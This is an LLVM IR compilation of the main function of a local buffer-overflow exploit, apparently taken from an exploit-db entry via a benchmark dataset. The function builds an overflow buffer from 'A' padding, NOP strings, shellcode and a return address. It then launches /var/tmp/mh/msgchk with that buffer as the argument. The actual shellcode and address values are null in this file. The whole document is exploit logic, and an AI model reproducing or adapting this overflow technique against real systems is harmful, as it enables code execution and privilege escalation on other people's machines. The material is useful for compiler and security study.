; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_21105.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_21105.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFSIZE = common dso_local global i32 0, align 4
@ALIGNSIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [39 x i8] c"usage : %s <bufsize> <align> <offset>\0A\00", align 1
@DEFNOPSIZE = common dso_local global i32 0, align 4
@nop = common dso_local global i8* null, align 8
@shellcode = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [2 x i8] c"A\00", align 1
@retaddr = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [19 x i8] c"/var/tmp/mh/msgchk\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"msgchk\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = load i32, i32* @BUFSIZE, align 4
  store i32 %13, i32* %8, align 4
  %14 = load i32, i32* @ALIGNSIZE, align 4
  store i32 %14, i32* %9, align 4
  store i32 0, i32* %10, align 4
  %15 = load i32, i32* %4, align 4
  %16 = icmp slt i32 %15, 1
  br i1 %16, label %17, label %23

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str, i64 0, i64 0), i8* %20)
  %22 = call i32 @exit(i32 -1) #3
  unreachable

23:                                               ; preds = %2
  %24 = load i32, i32* %4, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %31

26:                                               ; preds = %23
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 1
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @atoi(i8* %29)
  store i32 %30, i32* %8, align 4
  br label %31

31:                                               ; preds = %26, %23
  %32 = load i32, i32* %4, align 4
  %33 = icmp sgt i32 %32, 2
  br i1 %33, label %34, label %41

34:                                               ; preds = %31
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 2
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 @atoi(i8* %37)
  %39 = load i32, i32* @ALIGNSIZE, align 4
  %40 = add nsw i32 %38, %39
  store i32 %40, i32* %9, align 4
  br label %41

41:                                               ; preds = %34, %31
  %42 = load i32, i32* %4, align 4
  %43 = icmp sgt i32 %42, 3
  br i1 %43, label %44, label %49

44:                                               ; preds = %41
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 3
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @atoi(i8* %47)
  store i32 %48, i32* %10, align 4
  br label %49

49:                                               ; preds = %44, %41
  %50 = load i32, i32* %9, align 4
  %51 = load i32, i32* %8, align 4
  %52 = add nsw i32 %50, %51
  store i32 %52, i32* %12, align 4
  %53 = load i32, i32* %12, align 4
  %54 = call i8* @malloc(i32 %53)
  store i8* %54, i8** %6, align 8
  %55 = load i8*, i8** %6, align 8
  %56 = load i32, i32* %12, align 4
  %57 = call i32 @memset(i8* %55, i8 signext 0, i32 %56)
  %58 = load i8*, i8** %6, align 8
  %59 = load i32, i32* %9, align 4
  %60 = call i32 @memset(i8* %58, i8 signext 65, i32 %59)
  %61 = load i8*, i8** %6, align 8
  %62 = load i32, i32* %9, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i8, i8* %61, i64 %63
  store i8* %64, i8** %7, align 8
  store i32 0, i32* %11, align 4
  br label %65

65:                                               ; preds = %74, %49
  %66 = load i32, i32* %11, align 4
  %67 = load i32, i32* @DEFNOPSIZE, align 4
  %68 = sdiv i32 %67, 4
  %69 = icmp slt i32 %66, %68
  br i1 %69, label %70, label %77

70:                                               ; preds = %65
  %71 = load i8*, i8** %7, align 8
  %72 = load i8*, i8** @nop, align 8
  %73 = call i32 @strcat(i8* %71, i8* %72)
  br label %74

74:                                               ; preds = %70
  %75 = load i32, i32* %11, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %11, align 4
  br label %65

77:                                               ; preds = %65
  %78 = load i8*, i8** %7, align 8
  %79 = load i8*, i8** @shellcode, align 8
  %80 = call i32 @strcat(i8* %78, i8* %79)
  store i32 0, i32* %11, align 4
  br label %81

81:                                               ; preds = %94, %77
  %82 = load i32, i32* %11, align 4
  %83 = load i32, i32* %8, align 4
  %84 = load i32, i32* @DEFNOPSIZE, align 4
  %85 = sub nsw i32 %83, %84
  %86 = load i8*, i8** @shellcode, align 8
  %87 = call i32 @strlen(i8* %86)
  %88 = sub nsw i32 %85, %87
  %89 = sub nsw i32 %88, 8
  %90 = icmp slt i32 %82, %89
  br i1 %90, label %91, label %97

91:                                               ; preds = %81
  %92 = load i8*, i8** %7, align 8
  %93 = call i32 @strcat(i8* %92, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  br label %94

94:                                               ; preds = %91
  %95 = load i32, i32* %11, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %11, align 4
  br label %81

97:                                               ; preds = %81
  %98 = load i8*, i8** %7, align 8
  %99 = load i8*, i8** @retaddr, align 8
  %100 = call i32 @strcat(i8* %98, i8* %99)
  %101 = load i8*, i8** %6, align 8
  %102 = call i32 @execl(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0), i8* %101, i32* null)
  %103 = load i32, i32* %3, align 4
  ret i32 %103
}

declare dso_local i32 @printf(i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
